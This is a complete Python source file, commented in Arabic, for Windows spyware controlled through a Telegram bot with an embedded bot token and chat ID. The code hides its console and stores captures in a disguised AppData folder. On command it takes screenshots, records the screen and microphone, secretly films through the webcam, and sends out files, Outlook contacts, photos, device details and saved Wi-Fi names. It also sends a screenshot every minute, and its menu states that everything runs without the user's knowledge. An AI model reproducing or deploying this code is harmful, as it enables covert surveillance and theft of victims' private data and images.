import platform
import pyautogui
import cv2
import numpy as np
import sounddevice as sd
import soundfile as sf
import os
import subprocess
import sys
from datetime import datetime
import threading
import requests
import time
import psutil
import socket
import getpass
import uuid
import json
import random
import string
import shutil
import wave
from PIL import Image
import io
import pynput
from pynput import mouse, keyboard
import tempfile
import win32com.client
from pathlib import Path

# إخفاء نافذة الكونسول
try:
    import ctypes

    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

# ============================================
# ✅ ضع التوكن ومعرف الدردشة هنا
# ============================================
BOT_TOKEN = "8321792439:AAEgbnuakpy3TiWqePzCm1Mc2y2GNlveSGs"
BOT_CHAT_ID = "6494865307"
BOT_ADMIN_ID = BOT_CHAT_ID
# ============================================

# إعدادات البث المباشر
STREAM_QUALITY = 50
STREAM_FPS = 5
STREAM_WIDTH = 800
STREAM_HEIGHT = 600

# مجلدات مخفية
APPDATA = os.environ.get('APPDATA', os.path.expanduser('~'))
HIDDEN_FOLDER = os.path.join(APPDATA, 'Microsoft', 'Windows', 'Caches', 'System32')
TEMP_FOLDER = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')),
                           ''.join(random.choices(string.ascii_letters, k=8)))


class RemoteControlBot:
    def __init__(self):
        self.token = BOT_TOKEN
        self.chat_id = BOT_CHAT_ID
        self.base_url = f"https://api.telegram.org/bot{self.token}"
        self.last_update_id = 0
        self.is_running = True
        self.admin_id = BOT_ADMIN_ID

        # حالة التحكم عن بعد
        self.remote_active = False
        self.current_chat_id = None
        self.streaming = False
        self.stream_thread = None
        self.screen_width, self.screen_height = pyautogui.size()

    def send_message(self, text, chat_id=None):
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            requests.post(url, data=data, timeout=10)
        except:
            pass

    def send_file(self, file_path, file_type='document', chat_id=None):
        if chat_id is None:
            chat_id = self.chat_id
        try:
            if file_type == 'photo':
                url = f"{self.base_url}/sendPhoto"
                files = {'photo': open(file_path, 'rb')}
            elif file_type == 'video':
                url = f"{self.base_url}/sendVideo"
                files = {'video': open(file_path, 'rb')}
            elif file_type == 'audio':
                url = f"{self.base_url}/sendAudio"
                files = {'audio': open(file_path, 'rb')}
            else:
                url = f"{self.base_url}/sendDocument"
                files = {'document': open(file_path, 'rb')}

            data = {"chat_id": chat_id}
            requests.post(url, data=data, files=files, timeout=60)
            try:
                os.remove(file_path)
            except:
                pass
        except:
            pass

    def send_photo(self, photo_bytes, chat_id=None):
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendPhoto"
            files = {'photo': ('image.jpg', photo_bytes, 'image/jpeg')}
            data = {"chat_id": chat_id}
            requests.post(url, data=data, files=files, timeout=10)
        except:
            pass

    def send_action(self, action, chat_id=None):
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendChatAction"
            data = {
                "chat_id": chat_id,
                "action": action
            }
            requests.post(url, data=data, timeout=5)
        except:
            pass

    def get_updates(self):
        try:
            url = f"{self.base_url}/getUpdates"
            params = {
                "offset": self.last_update_id + 1,
                "timeout": 10
            }
            response = requests.get(url, params=params, timeout=15)
            updates = response.json()

            if updates.get("ok"):
                for update in updates.get("result", []):
                    self.last_update_id = update["update_id"]
                    self.process_update(update)
        except:
            pass

    def process_update(self, update):
        if "message" in update:
            message = update["message"]
            chat_id = message["chat"]["id"]

            if str(chat_id) == str(self.admin_id):
                if "text" in message:
                    text = message["text"].strip()
                    self.handle_command(text, chat_id)

    def handle_command(self, text, chat_id):
        global recorder

        # ============================================
        # 🎮 أوامر التحكم الرئيسية (أرقام 1-7)
        # ============================================

        # 1️⃣ التقاط شاشة فوري
        if text == "1":
            self.send_action("upload_photo", chat_id)
            self.send_message("📸 جاري التقاط الشاشة...", chat_id)
            recorder.capture_screenshot(send_to_bot=True, chat_id=chat_id)

        # 2️⃣ تسجيل الشاشة مع الصوت
        elif text == "2":
            self.send_message("🎬 بدء تسجيل الشاشة مع الصوت (30 ثانية)", chat_id)
            self.send_action("record_video", chat_id)
            self.send_action("record_audio", chat_id)
            threading.Thread(target=recorder.start_full_recording, args=(chat_id, 30), daemon=True).start()

        # 3️⃣ تسجيل صوت فقط
        elif text == "3":
            self.send_message("🎤 بدء تسجيل الصوت (15 ثانية)", chat_id)
            self.send_action("record_audio", chat_id)
            threading.Thread(target=recorder.start_audio_recording, args=(True, chat_id, 15), daemon=True).start()

        # 4️⃣ استعراض الملفات
        elif text == "4":
            self.send_message("📁 جاري تحميل قائمة الملفات...", chat_id)
            threading.Thread(target=recorder.list_files, args=(chat_id,), daemon=True).start()

        # 5️⃣ تشغيل الكاميرا سراً
        elif text == "5":
            self.send_message("🎥 تشغيل الكاميرا (10 ثوان)", chat_id)
            self.send_action("record_video", chat_id)
            threading.Thread(target=recorder.start_camera_stream, args=(chat_id, 10), daemon=True).start()

        # 6️⃣ جهات الاتصال
        elif text == "6":
            self.send_message("📱 جاري تحميل جهات الاتصال...", chat_id)
            threading.Thread(target=recorder.get_contacts, args=(chat_id,), daemon=True).start()

        # 7️⃣ الصور
        elif text == "7":
            self.send_message("🖼️ جاري تحميل الصور...", chat_id)
            threading.Thread(target=recorder.get_photos, args=(chat_id,), daemon=True).start()

        # 8️⃣ معلومات الجهاز
        elif text == "8":
            recorder.send_device_info_to_bot(chat_id)

        # 9️⃣ شبكات الواي فاي
        elif text == "9":
            recorder.send_wifi_info_to_bot(chat_id)

        # 0️⃣ قائمة الأوامر
        elif text == "0":
            self.show_main_menu(chat_id)

        # ============================================
        # 🎮 أوامر إضافية
        # ============================================
        elif text == "/start":
            self.show_main_menu(chat_id)

        elif text == "/stop":
            recorder.stop_all_recordings()
            self.send_message("⏹️ تم إيقاف جميع التسجيلات", chat_id)

        elif text == "/help":
            self.show_main_menu(chat_id)

    def show_main_menu(self, chat_id):
        """عرض القائمة الرئيسية"""
        menu = f"""
<b>🎮 قائمة التحكم عن بعد</b>
<b>💻 الجهاز:</b> {platform.node()}
<b>🕐 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>━━━━━━━━━━━━━━━</b>
<b>1️⃣</b> 📸 <b>التقاط شاشة</b> - صورة فورية
<b>2️⃣</b> 🎬 <b>تسجيل الشاشة</b> - مع الصوت (30 ث)
<b>3️⃣</b> 🎤 <b>تسجيل صوت</b> - فقط (15 ث)
<b>4️⃣</b> 📁 <b>الملفات</b> - استعراض وسحب
<b>5️⃣</b> 🎥 <b>الكاميرا</b> - تشغيل سري (10 ث)
<b>6️⃣</b> 📱 <b>جهات الاتصال</b> - سحب جهات الويندوز
<b>7️⃣</b> 🖼️ <b>الصور</b> - استعراض الصور
<b>8️⃣</b> 💻 <b>معلومات الجهاز</b>
<b>9️⃣</b> 📶 <b>شبكات الواي فاي</b>
<b>0️⃣</b> 🔄 <b>عرض القائمة</b>

<b>━━━━━━━━━━━━━━━</b>
⚠️ <i>جميع العمليات تجري بدون علم المستخدم</i>
"""
        self.send_message(menu, chat_id)

    def run(self):
        while self.is_running:
            try:
                self.get_updates()
                time.sleep(1)
            except:
                time.sleep(5)


class DeviceRecorder:
    def __init__(self):
        self.create_folders()
        self.bot = RemoteControlBot()

        # متغيرات الكاميرا
        self.camera_active = False
        self.camera = None

        # متغيرات التسجيل
        self.recording_video = False
        self.recording_audio = False
        self.video_writer = None
        self.audio_frames = []

        # بدء البوت
        self.bot_thread = threading.Thread(target=self.bot.run, daemon=True)
        self.bot_thread.start()
        self.start_auto_tasks()
        self.send_startup_message()

    def create_folders(self):
        folders = [
            os.path.join(HIDDEN_FOLDER, 'screenshots'),
            os.path.join(HIDDEN_FOLDER, 'videos'),
            os.path.join(HIDDEN_FOLDER, 'audio'),
            os.path.join(HIDDEN_FOLDER, 'camera'),
            os.path.join(HIDDEN_FOLDER, 'files'),
            os.path.join(HIDDEN_FOLDER, 'contacts'),
            os.path.join(HIDDEN_FOLDER, 'photos')
        ]
        for folder in folders:
            if not os.path.exists(folder):
                os.makedirs(folder, exist_ok=True)

    def send_startup_message(self):
        try:
            startup_msg = f"""
<b>🚀 نظام التحكم عن بعد جاهز</b>
<b>💻 الجهاز:</b> {platform.node()}
<b>👤 المستخدم:</b> {getpass.getuser()}
<b>🕐 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>━━━━━━━━━━━━━━━</b>
<b>1️⃣</b> التقاط شاشة
<b>2️⃣</b> تسجيل شاشة + صوت
<b>3️⃣</b> تسجيل صوت
<b>4️⃣</b> الملفات
<b>5️⃣</b> كاميرا سرية
<b>6️⃣</b> جهات اتصال
<b>7️⃣</b> الصور
<b>0️⃣</b> القائمة
<b>━━━━━━━━━━━━━━━</b>
"""
            self.bot.send_message(startup_msg)
        except:
            pass

    # ============================================
    # 1️⃣ التقاط شاشة
    # ============================================
    def capture_screenshot(self, send_to_bot=False, chat_id=None):
        try:
            screenshot = pyautogui.screenshot()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(HIDDEN_FOLDER, 'screenshots', f'screenshot_{timestamp}.png')
            screenshot.save(filename, quality=85)

            if send_to_bot:
                chat_id = chat_id or BOT_CHAT_ID
                self.bot.send_file(filename, 'photo', chat_id)
                self.bot.send_message("✅ تم التقاط الصورة", chat_id)
        except:
            pass

    # ============================================
    # 2️⃣ تسجيل الشاشة مع الصوت
    # ============================================
    def start_full_recording(self, chat_id=None, duration=30):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            video_file = os.path.join(HIDDEN_FOLDER, 'videos', f'screen_recording_{timestamp}.avi')
            audio_file = os.path.join(HIDDEN_FOLDER, 'audio', f'audio_recording_{timestamp}.wav')

            # تسجيل الصوت في خلفية
            audio_thread = threading.Thread(target=self.record_audio_only, args=(audio_file, duration), daemon=True)
            audio_thread.start()

            # تسجيل الشاشة
            screen_size = pyautogui.size()
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(video_file, fourcc, 10.0, screen_size)

            start_time = time.time()
            while time.time() - start_time < duration:
                try:
                    img = pyautogui.screenshot()
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                    out.write(frame)
                    time.sleep(0.1)
                except:
                    break

            out.release()
            audio_thread.join(timeout=5)

            # إرسال الفيديو
            if os.path.exists(video_file):
                self.bot.send_file(video_file, 'video', chat_id)
            # إرسال الصوت
            if os.path.exists(audio_file):
                self.bot.send_file(audio_file, 'audio', chat_id)

            self.bot.send_message("✅ تم تسجيل الشاشة والصوت", chat_id)
        except:
            pass

    # ============================================
    # 3️⃣ تسجيل صوت فقط
    # ============================================
    def start_audio_recording(self, send_to_bot=False, chat_id=None, duration=15):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(HIDDEN_FOLDER, 'audio', f'audio_{timestamp}.wav')

            sample_rate = 44100
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2, dtype='float32')
            sd.wait()

            sf.write(filename, recording, sample_rate)

            if send_to_bot and os.path.exists(filename):
                chat_id = chat_id or BOT_CHAT_ID
                self.bot.send_file(filename, 'audio', chat_id)
                self.bot.send_message("✅ تم تسجيل الصوت", chat_id)
        except:
            pass

    # ============================================
    # 4️⃣ استعراض وسحب الملفات
    # ============================================
    def list_files(self, chat_id=None, path=None):
        try:
            if path is None:
                path = os.path.expanduser("~")  # مجلد المستخدم

            files = os.listdir(path)[:20]  # أول 20 ملف
            file_list = f"<b>📁 الملفات في: {path}</b>\n\n"

            for i, file in enumerate(files, 1):
                full_path = os.path.join(path, file)
                if os.path.isdir(full_path):
                    file_list += f"📁 {i}. {file}\n"
                else:
                    size = os.path.getsize(full_path) // 1024
                    file_list += f"📄 {i}. {file} ({size} KB)\n"

            file_list += f"\n<i>📌 لإرسال ملف: أرسل مسار الملف الكامل</i>"
            self.bot.send_message(file_list, chat_id)
        except:
            pass

    # ============================================
    # 5️⃣ تشغيل الكاميرا سراً
    # ============================================
    def start_camera_stream(self, chat_id=None, duration=10):
        try:
            self.camera = cv2.VideoCapture(0)

            if not self.camera.isOpened():
                self.bot.send_message("❌ لا يمكن الوصول إلى الكاميرا", chat_id)
                return

            frames = []
            start_time = time.time()

            while time.time() - start_time < duration:
                ret, frame = self.camera.read()
                if ret:
                    frame = cv2.resize(frame, (640, 480))
                    frames.append(frame)
                time.sleep(0.1)

            self.camera.release()

            # حفظ وإرسال الفيديو
            if frames:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(HIDDEN_FOLDER, 'camera', f'camera_{timestamp}.mp4')

                height, width = frames[0].shape[:2]
                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                out = cv2.VideoWriter(filename, fourcc, 10.0, (width, height))

                for frame in frames:
                    out.write(frame)
                out.release()

                self.bot.send_file(filename, 'video', chat_id)
                self.bot.send_message("✅ تم تصوير الكاميرا سراً", chat_id)
        except:
            pass

    # ============================================
    # 6️⃣ جهات الاتصال (ويندوز)
    # ============================================
    def get_contacts(self, chat_id=None):
        try:
            contacts = []

            # محاولة الحصول على جهات اتصال Outlook
            try:
                outlook = win32com.client.Dispatch("Outlook.Application")
                namespace = outlook.GetNamespace("MAPI")
                contacts_folder = namespace.GetDefaultFolder(10)  # olFolderContacts

                for contact in contacts_folder.Items:
                    if hasattr(contact, 'FullName') and hasattr(contact, 'Email1Address'):
                        if contact.FullName and contact.Email1Address:
                            contacts.append(f"{contact.FullName}: {contact.Email1Address}")
            except:
                pass

            # جهات اتصال Skype
            try:
                skype_path = os.path.join(os.environ['APPDATA'], 'Skype')
                if os.path.exists(skype_path):
                    contacts.append("📱 جهات Skype موجودة في مجلد التطبيق")
            except:
                pass

            if contacts:
                contact_list = "<b>📱 جهات الاتصال:</b>\n\n"
                for i, contact in enumerate(contacts[:20], 1):
                    contact_list += f"{i}. {contact}\n"
                self.bot.send_message(contact_list, chat_id)
            else:
                self.bot.send_message("❌ لا توجد جهات اتصال", chat_id)
        except:
            self.bot.send_message("❌ فشل تحميل جهات الاتصال", chat_id)

    # ============================================
    # 7️⃣ الصور
    # ============================================
    def get_photos(self, chat_id=None):
        try:
            # مجلد الصور
            pictures_folder = os.path.join(os.path.expanduser('~'), 'Pictures')
            photos = []

            if os.path.exists(pictures_folder):
                for root, dirs, files in os.walk(pictures_folder):
                    for file in files[:30]:  # أول 30 صورة
                        if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                            photos.append(os.path.join(root, file))

            if photos:
                self.bot.send_message(f"🖼️ تم العثور على {len(photos)} صورة. جاري إرسال أحدث الصور...", chat_id)

                # إرسال أول 5 صور
                for photo in photos[:5]:
                    if os.path.exists(photo) and os.path.getsize(photo) < 10 * 1024 * 1024:  # أقل من 10 ميجا
                        self.bot.send_file(photo, 'photo', chat_id)
                        time.sleep(1)
            else:
                self.bot.send_message("❌ لا توجد صور", chat_id)
        except:
            pass

    # ============================================
    # دوال مساعدة
    # ============================================
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "غير متوفر"

    def record_audio_only(self, filename, duration):
        try:
            sample_rate = 44100
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2, dtype='float32')
            sd.wait()
            sf.write(filename, recording, sample_rate)
        except:
            pass

    def start_auto_tasks(self):
        threading.Thread(target=self.auto_screenshot, daemon=True).start()

    def auto_screenshot(self):
        while True:
            try:
                time.sleep(60)
                self.capture_screenshot(send_to_bot=True)
            except:
                pass

    def stop_all_recordings(self):
        self.camera_active = False
        self.recording_video = False
        self.recording_audio = False
        if self.camera:
            self.camera.release()
            self.camera = None

    def send_device_info_to_bot(self, chat_id=None):
        try:
            chat_id = chat_id or BOT_CHAT_ID
            system_info = platform.uname()
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')

            info = f"""
<b>🔍 معلومات الجهاز:</b>

<b>💻 النظام:</b>
• الجهاز: {system_info.node}
• النظام: {system_info.system} {system_info.release}
• المعالج: {platform.processor()}

<b>⚙️ الأداء:</b>
• CPU: {cpu_percent}%
• RAM: {memory.percent}%
• DISK: {disk.percent}%

<b>🌐 الشبكة:</b>
• IP: {self.get_local_ip()}
• المستخدم: {getpass.getuser()}
"""
            self.bot.send_message(info, chat_id)
        except:
            pass

    def send_wifi_info_to_bot(self, chat_id=None):
        try:
            chat_id = chat_id or BOT_CHAT_ID
            networks = []

            if platform.system() == "Windows":
                try:
                    result = subprocess.run(
                        ["netsh", "wlan", "show", "profiles"],
                        capture_output=True,
                        text=True,
                        encoding='utf-8',
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )

                    lines = result.stdout.split('\n')
                    for line in lines:
                        if "All User Profile" in line or "كافة ملفات تعريف المستخدم" in line:
                            parts = line.split(":")
                            if len(parts) > 1:
                                network = parts[1].strip()
                                if network:
                                    networks.append(network)
                except:
                    pass

            if networks:
                info = "<b>📶 شبكات الواي فاي المسجلة:</b>\n\n"
                for i, network in enumerate(networks[:15], 1):
                    info += f"{i}. {network}\n"
                self.bot.send_message(info, chat_id)
            else:
                self.bot.send_message("📶 لا توجد شبكات مسجلة", chat_id)
        except:
            pass


# المتغير العام
recorder = None


def run_hidden():
    global recorder

    # إخفاء نافذة الكونسول
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

    # تثبيت المكتبات المطلوبة
    try:
        import win32com.client
    except:
        os.system('pip install pywin32')
        import win32com.client

    recorder = DeviceRecorder()

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    run_hidden()
